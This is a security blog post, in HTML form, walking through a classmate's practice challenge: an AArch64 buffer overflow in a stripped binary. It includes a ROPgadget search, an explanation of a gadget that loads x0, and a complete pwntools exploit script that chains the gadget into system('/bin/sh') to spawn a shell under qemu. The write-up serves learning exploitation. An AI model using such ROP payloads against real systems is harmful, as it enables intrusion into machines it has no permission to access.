@@ -1,0 +1,82 @@
+<!doctype html>
+<html lang="en" data-theme="light"><head>
+  <meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>[AArch64] Buffer OverFlow (Practice) · whrds.log</title><meta name="description" content="※ If there are any mistakes, please let us know. We will check and correct it. ※ While studying aarch64 technique, a college classmate created a problem. It is a Buffer OverFlow problem named [Exploitable]. The symbol is deleted.. (Oh, it&#039;s annoying... But static is not applied...) to main()">
+  <meta name="theme-color" content="#f7f7f3"><link rel="canonical" href="https://whrds.github.io/en/posts/aarch64-buffer-overflow-practice/">
+  <link rel="alternate" hreflang="en" href="https://whrds.github.io/en/posts/aarch64-buffer-overflow-practice/"><link rel="alternate" hreflang="ko" href="https://whrds.github.io/ko/posts/aarch64-buffer-overflow-practice/">
+  <meta property="og:type" content="article"><meta property="og:title" content="[AArch64] Buffer OverFlow (Practice) · whrds.log"><meta property="og:description" content="※ If there are any mistakes, please let us know. We will check and correct it. ※ While studying aarch64 technique, a college classmate created a problem. It is a Buffer OverFlow problem named [Exploitable]. The symbol is deleted.. (Oh, it&#039;s annoying... But static is not applied...) to main()"><meta property="og:url" content="https://whrds.github.io/en/posts/aarch64-buffer-overflow-practice/">
+  <link rel="icon" href="/assets/favicon.svg" type="image/svg+xml"><link rel="stylesheet" href="/assets/styles.css">
+  <script>try{const t=localStorage.getItem('theme');if(t)document.documentElement.dataset.theme=t;else if(matchMedia('(prefers-color-scheme:dark)').matches)document.documentElement.dataset.theme='dark'}catch(e){}</script>
+  <script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","headline":"[AArch64] Buffer OverFlow (Practice)","description":"※ If there are any mistakes, please let us know. We will check and correct it. ※ While studying aarch64 technique, a college classmate created a problem. It is a Buffer OverFlow problem named [Exploitable]. The symbol is deleted.. (Oh, it's annoying... But static is not applied...) to main()","datePublished":"2024-05-01","inLanguage":"en","url":"https://whrds.github.io/en/posts/aarch64-buffer-overflow-practice/","author":{"@type":"Person","name":"whrds"}}</script>
+</head><body>
+  <a class="skip-link" href="#main">Skip to content</a>
+  <header class="site-header"><div class="shell header-inner">
+    <a class="brand" href="/en/" aria-label="whrds.log home"><span class="brand-mark">W_</span><span class="brand-text">whrds.log</span></a>
+    <nav class="main-nav" aria-label="Main navigation">
+      <a href="/en/" aria-current="page">Notes</a>
+      <a href="/en/about/">About</a>
+    </nav>
+    <div class="header-tools">
+      <div class="language-switch" aria-label="Language">
+        <a href="/ko/posts/aarch64-buffer-overflow-practice/" class="" lang="ko">KO</a>
+        <a href="#" class="active" lang="en" aria-current="true">EN</a>
+      </div>
+      <button class="icon-button" type="button" data-theme-toggle aria-label="Use dark theme">◐</button>
+    </div>
+  </div></header>
+  <main id="main"><article class="article-wrap"><header class="article-header"><p class="eyebrow">Security research notes</p><h1>[AArch64] Buffer OverFlow (Practice)</h1><p class="article-description">※ If there are any mistakes, please let us know. We will check and correct it. ※ While studying aarch64 technique, a college classmate created a problem. It is a Buffer OverFlow problem named [Exploitable]. The symbol is deleted.. (Oh, it&#039;s annoying... But static is not applied...) to main()</p><div class="article-meta"><time datetime="2024-05-01">May 1, 2024</time><span>·</span><span>2 min read</span></div></header><div class="prose"><p><strong>※ If there are any mistakes, please let me know. We will check and correct it. <strong>※</strong></strong></p>
+<p>While studying the aarch64 technique, a college classmate created a problem.</p>
+<p>It is a Buffer OverFlow problem named [Exploitable].</p>
+<p><img src="/assets/images/tistory/tistory-e16623b654cb/001.png" alt=""></p>
+<p>The symbol has been deleted… (Oh, it’s annoying… But static isn’t on…)</p>
+<p><img src="/assets/images/tistory/tistory-e16623b654cb/002.png" alt=""></p>
+<p>It is a function that appears as main().</p>
+<p>There are no visible vulnerabilities.</p>
+<p><img src="/assets/images/tistory/tistory-e16623b654cb/003.png" alt=""></p>
+<p>This is a function that is called.</p>
+<p>The structure is very simple. As in the example covered earlier, the bof vulnerability occurs in the called function, not main().</p>
+<p>However, since there is no function that immediately obtains a shell or outputs a flag, a chain must be formed using gadgets.</p>
+<pre><code>ROPgadget --binary Exploitable
+
+#0x0000000000400724 : ldr x0, [sp, #0x18] ; ldp x29, x30, [sp], #0x20 ; ret
+</code></pre>
+<p><img src="/assets/images/tistory/tistory-e16623b654cb/004.png" alt=""></p>
+<p>There is a gadget that looks delicious.</p>
+<p>Assuming that system(“/bin/sh”); is implemented, the first argument value must be passed to the x0 register.</p>
+<p>If you look at the gadget, there is a process of storing the value on the stack in x0, and x29 and x30 are overwritten through the ldp command.</p>
+<p>At this time, since x30 corresponds to ret, the command you want to implement can be implemented.</p>
+<p>Coincidentally, a function has been created to perform the scenario.</p>
+<p><img src="/assets/images/tistory/tistory-e16623b654cb/005.png" alt=""></p>
+<p>The problem is solved by getting the address of system() from the function and entering the /bin/sh string.</p>
+<pre><code>from pwn import *
+
+#p = process(['qemu-aarch64-static','./Exploitable'])
+p = process(['qemu-aarch64-static','-g','1234','./Exploitable'])
+e = ELF('./Exploitable')
+
+#ldr x0, [sp, #0x18] ; ldp x29, x30, [sp], #0x20 ; ret
+gadget = 0x0000000000400724
+system = 0x0000000000400590
+binsh = 0x420040
+
+payload = b'a'*0x28
+payload += p64(gadget)
+payload += b'a'*0x10
+payload += p64(system)*2
+payload += p64(0x0)
+payload += p64(binsh)
+
+p.sendlineafter(b'...', payload)
+
+p.interactive()
+</code></pre>
+<p>If you write in the above manner, you can obtain the shell.</p>
+<p>[</p>
+<p>Exploitable</p>
+<p>0.06MB</p>
+<p>](<a href="https://blog.kakaocdn.net/dna/bV6S14/btsG3tnmYfg/AAAAAAAAAAAAAAAAAAAAAI-s461KpxfspdkapSiGTS3atLDJ6NDOXd8oiTSqzxPr/Exploitable?credential=yqXZFxpELC7KVnFOS48ylbz2pIh7yKj8&amp;expires=1790780399&amp;allow_ip=&amp;allow_referer=&amp;signature=aLIIripn%2FRu39F%2BDa4zAWFcuGZc%3D&amp;attach=1&amp;knm=tfile.dat">https://blog.kakaocdn.net/dna/bV6S14/btsG3tnmYfg/AAAAAAAAAAAAAAAAAAAAAI-s461KpxfspdkapSiGTS3atLDJ6NDOXd8oiTSqzxPr/Exploitable?credential=yqXZFxpELC7KVnFOS48ylbz2pIh7yKj8&amp;expires=1790780399&amp;allow_ip=&amp;allow_referer=&amp;signature=aLIIripn%2FRu39F%2BDa4zAWFcuGZc%3D&amp;attach=1&amp;knm=tfile.dat</a>)</p>
+<p>I am uploading the file after receiving permission to share it.</p>
+</div><div class="article-end"><a href="/en/">← View all notes</a><a href="/ko/posts/aarch64-buffer-overflow-practice/" hreflang="ko">Read this post in Korean →</a></div></article></main>
+  <footer class="site-footer"><div class="shell footer-inner"><span>© 2026 whrds</span><span>Observe, verify, document.</span><a href="/en/feed.xml">RSS</a></div></footer>
+  <script src="/assets/app.js" defer></script>
+</body></html>
